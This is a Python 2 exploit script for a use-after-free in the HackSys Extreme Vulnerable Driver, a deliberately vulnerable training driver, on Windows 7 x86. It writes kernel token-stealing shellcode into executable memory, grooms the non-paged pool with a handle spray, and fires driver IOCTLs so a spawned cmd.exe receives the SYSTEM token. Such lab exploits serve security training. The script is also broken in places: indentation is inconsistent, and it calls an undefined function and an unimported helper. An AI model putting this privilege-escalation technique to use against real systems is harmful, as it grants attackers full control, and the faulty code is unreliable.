#Written By: Jb05s
#Purpose: HEVD - Use After Free -- Windows 7 SP1 x86
#Version: v0.1

import sys, struct, time
from ctypes import *
from ctypes.wintypes import *

#Windows API Shorthands
CreateProcessA = windll.kernel32.CreateProcessA
CreateFileA = windll.kernel32.CreateFileA
VirtualAlloc = windll.kernel32.VirtualAlloc
RtlMoveMemory = windll.kernel32.RtlMoveMemory
DeviceIoControl = windll.kernel32.DeviceIoControl
OutputDebugStringA = windll.kernel32.OutputDebugStringA
NtAllocateReserveObject = windll.ntdll.NtAllocateReserveObject
CloseHandle = windll.kernel32.CloseHandle

#Structure Globals
HANDLE = LPTSTR = c_void_p
LPBYTE = c_char_p

#CTL_CODE Globals
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003

#CreateProcessA() Globals
CREATE_NEW_CONSOLE = 0x10
CMD = "C:\\Windows\\System32\\cmd.exe"

#CreateFileA() Globals
DEVICE = "\\\\.\\HackSysExtremeVulnerableDriver"
GENERIC_READ_WRITE = 0xC0000000
OPEN_EXISTING = 0x3
FILE_ATTRIBUTE_NORMAL = 0x80

#VirtualAlloc() Globals
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

class STARTUPINFO(Structure):
    #STARTUPINFO Structure for CreateProcessA()
    _fields_ = [("cb", DWORD),
                    ("lpReserved", LPTSTR),
                    ("lpDesktop", LPTSTR),
                    ("lpTitle", LPTSTR),
                    ("dwX", DWORD),
                    ("dwY", DWORD),
                    ("dwXSize", DWORD),
                    ("dwYSize", DWORD),
                    ("dwXCountChars", DWORD),
                    ("dwYCountChars", DWORD),
                    ("dwFillAttribute", DWORD),
                    ("dwFlags", DWORD),
                    ("wShowWindow", WORD),
                    ("cbReserved2", WORD),
                    ("lpReserved2", LPBYTE),
                    ("hStdInput", HANDLE),
                    ("hStdOutput", HANDLE),
                    ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    #PROCESS_INFORMATION Structure for CreateProcessA()
	_fields_ = [("hProcess", HANDLE),
                    	("hThread", HANDLE),
                    	("dwProcessId", DWORD),
                    	("dwThreadId", DWORD)]

def debug_print(message):
	print(message)

        OutputDebugStringA(message + "\n")

def ctl_code(function,
		devicetype = FILE_DEVICE_UNKNOWN,
		access = FILE_ANY_ACCESS,
		method = METHOD_NEITHER):
	return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def getprocess():
    	#Declare CreateProcessA() Variables
    	lpApplicationName = CMD
    	lpCommandLine = CMD
    	lpProcessAttributes = None
    	lpThreadAttributes = None
    	bInheritHandles = 0
    	dwCreationFlags = CREATE_NEW_CONSOLE
    	lpEnvironment = None
    	lpCurrentDirectory = None

    	#Setup Structure References
    	lpStartupInfo = STARTUPINFO()
    	lpStartupInfo.cb = sizeof(lpStartupInfo)
    	lpProcessInformation = PROCESS_INFORMATION()

    	spawn = CreateProcessA(lpApplicationName,
                                lpCommandLine,
                                lpProcessAttributes,
                                lpThreadAttributes,
                                bInheritHandles,
                                dwCreationFlags,
                                lpEnvironment,
                                lpCurrentDirectory,
                                byref(lpStartupInfo),
                                byref(lpProcessInformation))

    	if not spawn:
        	debug_print("\t[-] Error - Unable to spawn new process: " + FormatError())
        	sys.exit(-1)

    	#Delay - Ensure CMD is Fully Spawned Before Executing Token-Stealing Shellcode
    	time.sleep(1)

    	debug_print("[+] Spawning new process with the following PID: %d" % lpProcessInformation.dwProcessId)
    	return lpProcessInformation.dwProcessId

def gethandle():
    	#Declare CreateFileA() Variables
    	lpFileName = DEVICE
    	dwDesiredAccess = GENERIC_READ_WRITE
    	dwShareMode = 0
    	lpSecurityAttributes = None
    	dwCreationDisposition = OPEN_EXISTING
    	dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    	hTemplateFile = None

   	handle = CreateFileA(lpFileName, 
                            dwDesiredAccess,
                            dwShareMode,
                            lpSecurityAttributes,
                            dwCreationDisposition,
                            dwFlagsAndAttributes,
                            hTemplateFile)

    	if not handle or handle == -1:
        	debug_print("\t[-] Error - Unable to get device handle: " + FormatError())
        	sys.exit(-1)

    	debug_print("[+] Got device handle: 0x%x" % handle)
    	return handle

def shellcode(pid):
    	tokenstealing = (
        	"\x60"                              # PUSHAD
        	"\x64\x8B\x15\x24\x01\x00\x00"      # MOV EAX, FS:124       ; Kthread offset
        	"\x8B\x42\x50"                      # MOV EAX, [EAX+0x50]   ; Eprocess offset
        	"\x50"                              # PUSH EAX              ; Push Eprocess offset to stack to use later
        	"\xBB\x04\x00\x00\x00"              # MOV EBX, 4            ; SYSTEM pid
        	"\x8B\x80\xB8\x00\x00\x00"          # MOV EAX, [EAX+0xB8]   ; Next flink in ActiveProcessLink (Loop begin)
        	"\x2D\xB8\x00\x00\x00"              # SUB EAX, 0xB8         ; Move that ass to the next link
        	"\x39\x98\xB4\x00\x00\x00"          # CMP [EAX+0xB4], EBX   ; CMP UniqueProcessID to EBX (SYSTEM PID 4)
        	"\x75\xED"                          # JNZ up                ; If not PID 4 then jump to loop start
        	"\x8B\xB8\xF8\x00\x00\x00"          # MOV EDI, [EAX+0xF8]   ; Move TOKEN value of SYSTEM process to EDI
        	"\x83\xE7\xF8"                      # AND EDI, FFFFFFFF8    ; Token value must be aligned by 8
        	"\x58"                              # POP EAX               ; Pop Eprocess offset
        	"\xBB" + struct.pack("<I", pid) +   # MOV EBX, cmdPID       ; Move the PID of cmd.exe to ebx
        	"\x8B\x80\xB8\x00\x00\x00"          # MOV EAX, [EAX+0xB8]   ; Next flink in ActiveProcessLink (Loop begin)
        	"\x2D\xB8\x00\x00\x00"              # SUB EAX, 0xB8         ; Move that ass to the next link
        	"\x39\x98\xB4\x00\x00\x00"          # CMP [EAX+0xB4], EBX   ; CMP UniqueProcessID to EBX (cmd.exe PID)
        	"\x75\xED"                          # JNZ up                ; If not cmd.exe PID then jump to loop start
        	"\x89\xB8\xF8\x00\x00\x00"          # MOV [EAX+0xF8], EDI   ; Copy SYSTEM TOKEN to overwrite cmd.exe TOKEN
        	"\x61"                              # POPAD
        	"\xC3")                             # RETN

	debug_print("[+] Allocating buffer for tokenstealing shellcode..")

    	#Declare Variables
    	lpAddress = c_int(0)
   	dwSize = c_int(len(tokenstealing))
    	flAllocationType = c_int((MEM_COMMIT | MEM_RESERVE))
    	flProtect = c_int(PAGE_EXECUTE_READWRITE)

    	alloc = VirtualAlloc(lpAddress,
                            	dwSize,
                            	flAllocationType,
                            	flProtect)

    	if not alloc:
        	debug_print("\t[-] Error - Unable to allocate tokenstealing shellcode: " + FormatError())
        	sys.exit(-1)

    	debug_print("[+] Tokenstealing shellcode has been allocated at: 0x%x" % alloc)

    	memmove(alloc, tokenstealing, len(tokenstealing))
    	return alloc

def glock():
    	#Declare NtAllocateReserveObject() Variables
    	hObject = byref(HANDLE())
    	ObjectAttributes = 0
    	ObjectType = 1
        
    	spray_array1 = []
    	spray_array2 = []

    	debug_print("[*] Starting heap spray..")
    	debug_print("\t[+] Spraying non-paged pool for derandomization.")
    	for j in xrange(10000):
        	result = NtAllocateReserveObject(hObject,
                                            	ObjectAttributes,
                                            	ObjectType)

        spray_array1.append(result)

	debug_print("\t[+] Now spraying to allocate consecutive objects.")
    
	for b in xrange(5000):
        	result = NtAllocateReserveObject(hObject,
                                            	ObjectAttributes,
                                            	ObjectType)
	
		spray_array2.append(result)

	debug_print("\t[+] Making holes in the consecutive objects")
	
	for o in xrange(0, 5000, 2):
		CloseHandle(spray_array2[o])

def trigger(hDevice, dwIoControlCode, lpInBuffer, nInBufferSize):
    	#Declare DeviceIoControl() Variables
    	lpOutBuffer = None
    	nOutBufferSize = 0
    	lpBytesReturned = byref(c_ulong())
    	lpOverlapped = None

	ownit = DeviceIoControl(hDevice,
                                	dwIoControlCode,
                                	lpInBuffer,
                                	nInBufferSize,
                                	lpOutBuffer,
                                	nOutBufferSize,
                                	lpBytesReturned,
                                	lpOverlapped)

    	if not ownit:
        	debug_print("\t[-] Error - Exploit failed: " + FormatError())
        	sys.exit(-1)

if __name__ == "__main__":

	pid = getprocess()
	shellcode = tokenstealing(pid)
	glock()
	debug_print("[*] Setting up vulnerability stage.")
	trigger(gethandle(), ctl_code(0x804), 0, 0)
	debug_print("\t[+] Use After Free object allocated.")
	trigger(gethandle(), ctl_code(0x806), 0, 0)
	debug_print("\t[+] Use After Free object was freed.")
	lpInBuffer = create_string_buffer(struct.pack("<L", shellcode) + "\x41" * 0x5b + "\x00")
	trigger(gethandle(), ctl_code(0x807), lpInBuffer, len(lpInBuffer))
	debug_print("\t[+] Fake object has been allocated.")
	debug_print("[*] Triggering Use After Free vulnerability")
	trigger(gethandle(), ctl_code(0x805), 0, 0)
